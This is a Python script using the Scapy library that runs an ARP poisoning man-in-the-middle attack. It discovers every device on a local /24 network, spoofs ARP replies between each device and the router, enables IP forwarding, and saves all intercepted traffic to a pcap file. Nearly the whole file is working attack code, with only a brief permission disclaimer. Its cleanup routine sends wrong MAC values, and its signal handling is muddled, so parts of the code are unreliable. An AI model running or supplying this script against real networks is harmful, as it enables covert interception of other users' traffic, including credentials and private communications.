"""
ARP Spoofing / ARP Poisoning Script with Packet Capture

This script performs an ARP spoofing attack on a local network segment,
intercepting traffic between hosts and the router by poisoning their ARP tables.
It captures the traffic into a pcap file for analysis.

WARNING:
- This script should be run with root/administrator privileges.
- Use responsibly and only on networks where you have permission.
- Enabling IP forwarding is required for traffic routing.
- Tested on Unix-like systems. On Windows, some features/signals may be limited.
"""

import signal
import sys
import os
import time
import threading
from scapy.all import *

def signal_handler(signum, frame):
    """
    Handles termination signals to gracefully stop the script.
    """
    os.kill(os.getpid(), signal.SIGINT)
    time.sleep(0.1)
    try:
        os.kill(os.getpid(), signal.SIGTERM)
    except AttributeError:
        # SIGTERM may not be available on Windows; ignore if so
        pass
    time.sleep(0.1)
    # SIGTSTP (stop signal) not available on Windows; not invoked here

def restore_network(target_ip, target_mac, source_ip):
    """
    Restores the ARP table of the target by sending correct ARP replies.
    """
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip,
             hwsrc=target_mac, psrc=source_ip))

def arp_request(target_ip, target_mac, source_ip):
    """
    Sends a spoofed ARP reply to the target, poisoning their ARP cache.
    """
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip))

def arp_poisoning(network_ips, network_macs, router_ip, router_mac, local_mac):
    """
    Main poisoning loop. Enables IP forwarding and repeatedly sends spoofed ARP replies.
    """
    try:
        os.system("sysctl -w net.ipv4.ip_forward=1")  # Enable IP forwarding on Unix
    except Exception as e:
        print("Error: Could not enable IP forwarding:", e)
        sys.exit(1)

    while True:
        for i in range(len(network_ips)):
            try:
                arp_request(network_ips[i], network_macs[i], router_ip)
                arp_request(router_ip, router_mac, network_ips[i])
                time.sleep(2)
            except Exception:
                pass

def main():
    """
    Main entry point: detects network devices, starts poisoning and captures traffic.
    """
    conf.verb = 0
    router_ip = '192.168.1.1'
    network_range = '192.168.1.0/24'
    conf.iface = 'wlp3s0'  # Change to your network interface

    print("\n[+] Getting router MAC address...")
    router_response = srp1(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=router_ip),
                           retry=-2, timeout=2)

    if router_response is None:
        print(f"[!] Router {router_ip} did not respond.")
        sys.exit(1)

    router_mac = router_response[ARP].hwsrc
    local_ip = router_response[ARP].pdst
    local_mac = router_response[ARP].hwdst

    print("[+] Scanning network for active devices...")
    answered, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=network_range),
                              retry=-2, timeout=2)

    network_ips = []
    network_macs = []

    for _, response in answered:
        if response[ARP].psrc != router_ip:
            network_ips.append(response[ARP].psrc)
            network_macs.append(response[ARP].hwsrc)

    if len(network_ips) == 0:
        print("[!] No devices detected on the network.")
        sys.exit(1)
    else:
        print(f"[+] Found {len(network_ips)} devices on the network:\n")

    print(f"[+] Router: IP = {router_ip} MAC = {router_mac}\n")
    for ip, mac in zip(network_ips, network_macs):
        print(f"[+] Device: IP = {ip} MAC = {mac}")

    poison_thread = threading.Thread(target=arp_poisoning,
                                     args=(network_ips, network_macs, router_ip, router_mac, local_mac))
    poison_thread.start()

    try:
        print("\n[+] Capturing traffic to 'capture.pcap'...\n")
        wrpcap("capture.pcap", sniff())
    except Exception as e:
        print("Error capturing packets:", e)

    print("\n[+] Restoring network tables...")
    for i in range(len(network_ips)):
        try:
            restore_network(network_ips[i], network_macs[i], router_ip)
            restore_network(router_ip, router_mac, network_ips[i])
        except Exception:
            pass

    try:
        os.system("sysctl -w net.ipv4.ip_forward=0")
    except Exception:
        pass

    print("\n[+] Poisoning finished, exiting...")
    sys.exit(0)

if __name__ == '__main__':
    import platform
    if platform.system() != 'Windows':
        signal.signal(signal.SIGTERM, signal_handler)
        signal.signal(signal.SIGTSTP, signal_handler)
    else:
        signal.signal(signal.SIGINT, signal_handler)

    main()